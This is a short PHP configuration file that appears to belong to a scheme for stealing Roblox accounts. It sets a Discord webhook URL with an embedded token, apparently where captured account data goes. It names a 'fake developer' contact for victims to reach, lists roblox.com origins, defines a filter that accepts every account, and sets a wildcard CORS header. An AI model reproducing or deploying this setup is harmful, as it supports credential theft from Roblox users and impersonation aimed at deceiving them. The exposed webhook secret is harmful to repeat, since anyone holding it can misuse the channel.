<?php


    $webhook = "https://discord.com/api/webhooks/1266814790882426890/WZs5L9-S7xqbP3EU5ea-tOJ3urnYUDtT1wN_fL4wAa3LhCJcr935cnkrsse9nceLdEGz";
    // fake developer for the bot the users may contact
    $discord_contact = "daddydraw";
    
    $allowed_origins = array(
        "https://www.roblox.com",
        "https://web.roblox.com"
    );
    function account_filter($profile) {
        return true;
    }
       require("status.php");
           header("Access-Control-Allow-Origin: *");
?>
